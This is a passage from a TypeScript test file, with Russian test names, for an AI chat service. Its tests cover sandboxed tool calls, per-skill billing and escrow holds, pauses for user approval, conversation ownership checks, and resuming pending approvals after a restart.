      const toolMessage = secondCallMessages[secondCallMessages.length - 1];

      expect(toolMessage).toBeInstanceOf(ToolMessage);
      expect(toolMessage?.content).toBe('{"results":[]}');
    });

    it('передаёт freeCallsLimit Freemium-навыка', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('github', EXEC_TOOL_NAME, {
          model: 'Freemium',
          price: 0.02,
          currency: 'RUB',
          freeCallsLimit: 50,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'gh --version' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(
            toolCallMessage(EXEC_TOOL_NAME, { command: 'gh --version' }),
          ),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      billing.checkAndChargeSkill.mockResolvedValue(null);
      sandbox.runCommand.mockResolvedValue('gh version 2.0.0\n');

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'gh --version'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      expect(billing.checkAndChargeSkill).toHaveBeenCalledWith(
        USER_ID,
        'github',
        0.02,
        50,
      );
      expect(sandbox.runCommand).toHaveBeenCalledWith(
        'gh --version',
        {},
        { egress: { allowlist: ['api.github.com', 'github.com'] } },
      );
    });

    it('не списывает средства за бесплатный навык', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME, { model: 'Free' }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди новости' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'новости' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      sandbox.runCommand.mockResolvedValue('{"results":[]}');

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'найди новости'),
      ).resolves.toMatchObject({ reply: 'Готово' });

      expect(billing.checkAndChargeSkill).not.toHaveBeenCalled();
      expect(sandbox.runCommand).toHaveBeenCalledTimes(1);
    });

    it('не списывает за инструмент, которого нет в манифестах', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'запусти echo hi' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово: hi')));
      sandbox.runCommand.mockResolvedValue('hi\n');

      const result = await service.handleMessage(
        USER_ID,
        CONVERSATION_ID,
        'запусти echo hi',
      );

      expect(result.reply).toBe('Готово: hi');
      expect(billing.checkAndChargeSkill).not.toHaveBeenCalled();
      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
        egress: undefined,
      });
    });

    it('прерывает выполнение при нехватке средств', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME, {
          model: 'Pay-per-Call',
          price: 0.05,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди новости' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'новости' })),
      );
      billing.checkAndChargeSkill.mockRejectedValue(
        new BadRequestException(ERROR_KEYS.insufficientFunds),
      );

      const result = await service.handleMessage(
        USER_ID,
        CONVERSATION_ID,
        'найди новости',
      );

      expect(result).toEqual({
        conversationId: CONVERSATION_ID,
        reply: ERROR_KEYS.insufficientFunds,
      });

      // Песочница не запускалась, второй вызов LLM не состоялся.
      expect(sandbox.runCommand).not.toHaveBeenCalled();
      expect(chatWithToolsStream).toHaveBeenCalledTimes(1);

      expect(prisma.message.create).toHaveBeenNthCalledWith(2, {
        data: {
          conversationId: CONVERSATION_ID,
          role: 'assistant',
          content: ERROR_KEYS.insufficientFunds,
        },
      });
    });

    it('запрещает писать в чужой диалог', async () => {
      prisma.conversation.findUnique.mockResolvedValue({
        id: CONVERSATION_ID,
        userId: OTHER_USER_ID,
      });

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'привет'),
      ).rejects.toBeInstanceOf(ForbiddenException);
      expect(prisma.message.create).not.toHaveBeenCalled();
      expect(chatWithToolsStream).not.toHaveBeenCalled();
      expect(billing.getBalance).not.toHaveBeenCalled();
    });

    it('отклоняет сообщение в несуществующий диалог', async () => {
      prisma.conversation.findUnique.mockResolvedValue(null);

      await expect(
        service.handleMessage(USER_ID, CONVERSATION_ID, 'привет'),
      ).rejects.toBeInstanceOf(NotFoundException);
      expect(prisma.message.create).not.toHaveBeenCalled();
      expect(chatWithToolsStream).not.toHaveBeenCalled();
    });
  });

  describe('streamMessage', () => {
    beforeEach(() => {
      prisma.conversation.findUnique.mockResolvedValue({
        id: CONVERSATION_ID,
        userId: USER_ID,
      });
      prisma.message.create.mockResolvedValue({});
      prisma.conversation.update.mockResolvedValue({});
      billing.getBalance.mockResolvedValue({ balance: '10.00' });
    });

    it('отдаёт чанки в onDelta и сохраняет полный ответ', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'привет' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        (async function* () {
          yield { type: 'delta', text: 'При' };
          yield { type: 'delta', text: 'вет' };
          yield { type: 'message', message: new AIMessage('Привет') };
        })(),
      );

      const deltas: string[] = [];
      const result = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'привет',
        (text) => deltas.push(text),
      );

      expect(deltas).toEqual(['При', 'вет']);
      expect(result).toEqual({
        conversationId: CONVERSATION_ID,
        reply: 'Привет',
      });
      expect(prisma.message.create).toHaveBeenNthCalledWith(2, {
        data: {
          conversationId: CONVERSATION_ID,
          role: 'assistant',
          content: 'Привет',
        },
      });
    });

    it('отправляет office_event при выполнении инструмента', async () => {
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'запусти echo hi' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово: hi')));
      sandbox.runCommand.mockResolvedValue('hi\n');

      const officeEvents: OfficeEvent[] = [];
      const result = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'запусти echo hi',
        () => {},
        (event) => officeEvents.push(event),
      );

      expect(officeEvents).toEqual([
        {
          conversationId: CONVERSATION_ID,
          agentId: 'default',
          status: 'working',
          task: 'Выполнение кода',
        },
      ]);
      expect(result.reply).toBe('Готово: hi');
    });

    it('приостанавливает выполнение до approve_action и возобновляется', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('code-runner', SANDBOX_TOOL_NAME, { model: 'Free' }, true),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'запусти echo hi' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово: hi')));
      sandbox.runCommand.mockResolvedValue('hi\n');

      const officeEvents: OfficeEvent[] = [];
      const result = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'запусти echo hi',
        () => {},
        (event) => officeEvents.push(event),
      );

      expect(result).toMatchObject({
        conversationId: CONVERSATION_ID,
        reply: '',
        pendingApproval: true,
      });
      expect(officeEvents).toContainEqual({
        conversationId: CONVERSATION_ID,
        agentId: 'default',
        status: 'waiting_approval',
        task: 'Ожидание подтверждения: Выполнение кода',
        reason: 'approval',
      });
      // До одобрения песочница не запускается.
      expect(sandbox.runCommand).not.toHaveBeenCalled();

      // Чужой пользователь не может одобрить чужой диалог.
      await expect(
        service.approveAction(OTHER_USER_ID, CONVERSATION_ID, true),
      ).rejects.toBeInstanceOf(ForbiddenException);

      const approved = await service.approveAction(
        USER_ID,
        CONVERSATION_ID,
        true,
        () => {},
      );

      expect(approved).toMatchObject({ reply: 'Готово: hi' });
      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
        egress: undefined,
      });

      // Повторное одобрение уже завершённого ожидания — null.
      await expect(
        service.approveAction(USER_ID, CONVERSATION_ID, true),
      ).resolves.toBeNull();
    });

    it('помечает waiting_approval для Pay-per-Outcome как payment', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill(
          'outcome-approval',
          SANDBOX_TOOL_NAME,
          { model: 'Pay-per-Outcome', price: 100 },
          true,
        ),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сгенерируй результат' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово')));
      sandbox.runCommand.mockResolvedValue('hi\n');
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      const officeEvents: OfficeEvent[] = [];
      const result = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'сгенерируй результат',
        () => {},
        (event) => officeEvents.push(event),
      );

      expect(result.pendingApproval).toBe(true);
      expect(officeEvents).toContainEqual(
        expect.objectContaining({
          conversationId: CONVERSATION_ID,
          status: 'waiting_approval',
          reason: 'payment',
        }),
      );
      // Hold создан ДО паузы и с детерминированным идемпотентным ключом.
      expect(billing.authorizeHold).toHaveBeenCalledWith(
        USER_ID,
        100,
        `approval:${CONVERSATION_ID}:call-1`,
      );
      expect(sandbox.runCommand).not.toHaveBeenCalled();

      const approved = await service.approveAction(
        USER_ID,
        CONVERSATION_ID,
        true,
      );

      expect(approved?.reply).toBe('Готово');
      expect(billing.captureHold).toHaveBeenCalledWith('hold-1');
      // Hold переиспользован (replay), а не создан второй.
      expect(
        billing.authorizeHold.mock.calls.filter(
          (call) => call[2] === `approval:${CONVERSATION_ID}:call-1`,
        ),
      ).toHaveLength(2);
    });

    it('отклонение одобрения отменяет escrow-hold', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill(
          'outcome-approval',
          SANDBOX_TOOL_NAME,
          { model: 'Pay-per-Outcome', price: 100 },
          true,
        ),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сгенерируй результат' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(
          streamOf(new AIMessage('Пользователь отклонил действие')),
        );
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'сгенерируй результат',
        () => {},
      );

      const result = await service.approveAction(
        USER_ID,
        CONVERSATION_ID,
        false,
      );

      expect(result?.reply).toBe('Пользователь отклонил действие');
      expect(billing.cancelHold).toHaveBeenCalledWith('hold-1');
      expect(billing.captureHold).not.toHaveBeenCalled();
      expect(sandbox.runCommand).not.toHaveBeenCalled();
    });

    it('переживает рестарт API: pending approval и escrow восстанавливаются', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill(
          'outcome-approval',
          SANDBOX_TOOL_NAME,
          { model: 'Pay-per-Outcome', price: 100 },
          true,
        ),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сгенерируй результат' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово после рестарта')));
      sandbox.runCommand.mockResolvedValue('hi\n');
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      const first = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'сгенерируй результат',
        () => {},
      );

      expect(first.pendingApproval).toBe(true);

      const pendingBefore =
        await service.listPendingApprovals(USER_ID);
      expect(pendingBefore).toHaveLength(1);
      expect(pendingBefore[0]).toMatchObject({
        conversationId: CONVERSATION_ID,
        reason: 'payment',
      });

      // Эмуляция рестарта: новый ChatService и новый скомпилированный граф,
      // но тот же checkpointer и та же таблица ожиданий.
      const restarted = await createServiceInstance(
        checkpointer,
        pendingApprovals,
      );

      const deltas: string[] = [];
      const resumed = await restarted.approveAction(
        USER_ID,
        CONVERSATION_ID,
        true,
        (text) => deltas.push(text),
      );

      expect(resumed).toMatchObject({ reply: 'Готово после рестарта' });
      expect(deltas).toEqual(['Готово после рестарта']);
      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
        egress: undefined,
      });
      expect(billing.captureHold).toHaveBeenCalledWith('hold-1');
      expect(await restarted.listPendingApprovals(USER_ID)).toEqual([]);
    });

    it('переживает рестарт API с PostgreSQL-checkpointer (fake-БД)', async () => {
      const database = createFakeCheckpointPrisma();
      const prismaWithPersistence = prisma as unknown as Record<string, unknown>;

      prismaWithPersistence.graphCheckpoint =
        database.prisma.graphCheckpoint;
      prismaWithPersistence.graphCheckpointWrite =
        database.prisma.graphCheckpointWrite;
      prismaWithPersistence.pendingApproval =
        database.prisma.pendingApproval;

      const prismaService = prismaWithPersistence as unknown as PrismaService;
      const dbCheckpointer = new PrismaCheckpointSaver(prismaService);
      const dbPendingApprovals = new PendingApprovalService(prismaService);

      const firstService = await createServiceInstance(
        dbCheckpointer,
        dbPendingApprovals,
      );

      skills.getEnabledSkills.mockResolvedValue([
        createSkill(
          'outcome-approval',
          SANDBOX_TOOL_NAME,
          { model: 'Pay-per-Outcome', price: 100 },
          true,
        ),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сгенерируй результат' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Готово из PostgreSQL')));
      sandbox.runCommand.mockResolvedValue('hi\n');
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      const first = await firstService.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'сгенерируй результат',
        () => {},
      );
      expect(first.pendingApproval).toBe(true);
      expect(database.state.graphCheckpoints.length).toBeGreaterThan(0);
      expect(database.state.pendingApprovals).toHaveLength(1);

      // «Рестарт»: новые saver/service поверх той же fake-БД.
      const restartedService = await createServiceInstance(
        new PrismaCheckpointSaver(prismaService),
        new PendingApprovalService(prismaService),
      );

      const deltas: string[] = [];
      const resumed = await restartedService.approveAction(
        USER_ID,
        CONVERSATION_ID,
        true,
        (text) => deltas.push(text),
      );

      expect(resumed).toMatchObject({ reply: 'Готово из PostgreSQL' });
      expect(deltas).toEqual(['Готово из PostgreSQL']);
      expect(billing.captureHold).toHaveBeenCalledWith('hold-1');
      expect(sandbox.runCommand).toHaveBeenCalledWith('echo hi', {}, {
        egress: undefined,
      });
      expect(
        await restartedService.listPendingApprovals(USER_ID),
      ).toEqual([]);
    });

    it('новое сообщение отменяет устаревшее ожидание и чистит checkpoint', async () => {
      skills.getEnabledSkills.mockResolvedValue([
        createSkill(
          'outcome-approval',
          SANDBOX_TOOL_NAME,
          { model: 'Pay-per-Outcome', price: 100 },
          true,
        ),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'сгенерируй результат' },
      ]);
      chatWithToolsStream
        .mockReturnValueOnce(
          streamOf(toolCallMessage(SANDBOX_TOOL_NAME, { code: 'echo hi' })),
        )
        .mockReturnValueOnce(streamOf(new AIMessage('Новый ответ')));
      billing.authorizeHold.mockResolvedValue({ entryId: 'hold-1' });

      const first = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'сгенерируй результат',
        () => {},
      );
      expect(first.pendingApproval).toBe(true);

      // Пользователь не подтвердил действие, а написал новое сообщение:
      // старое ожидание отменяется, hold возвращается, граф стартует заново.
      const second = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'другое сообщение',
        () => {},
      );

      expect(second.reply).toBe('Новый ответ');
      expect(billing.cancelHold).toHaveBeenCalledWith('hold-1');
      expect(await service.listPendingApprovals(USER_ID)).toEqual([]);
    });

    it('отправляет ошибку paywall в стрим и сохраняет её', async () => {
      vi.stubEnv('TAVILY_API_KEY', 'test-tavily-key');
      skills.getEnabledSkills.mockResolvedValue([
        createSkill('tavily-search', WEB_SEARCH_TOOL_NAME, {
          model: 'Pay-per-Call',
          price: 0.05,
        }),
      ]);
      prisma.message.findMany.mockResolvedValue([
        { role: 'user', content: 'найди новости' },
      ]);
      chatWithToolsStream.mockReturnValueOnce(
        streamOf(toolCallMessage(WEB_SEARCH_TOOL_NAME, { query: 'новости' })),
      );
      billing.checkAndChargeSkill.mockRejectedValue(
        new BadRequestException(ERROR_KEYS.insufficientFunds),
      );

      const deltas: string[] = [];
      const result = await service.streamMessage(
        USER_ID,
        CONVERSATION_ID,
        'найди новости',
        (text) => deltas.push(text),
      );

      expect(deltas).toEqual([ERROR_KEYS.insufficientFunds]);
      expect(result.reply).toBe(ERROR_KEYS.insufficientFunds);
      expect(sandbox.runCommand).not.toHaveBeenCalled();
      expect(prisma.message.create).toHaveBeenNthCalledWith(2, {
        data: {
          conversationId: CONVERSATION_ID,
          role: 'assistant',
          content: ERROR_KEYS.insufficientFunds,
        },
      });
    });
  });
});
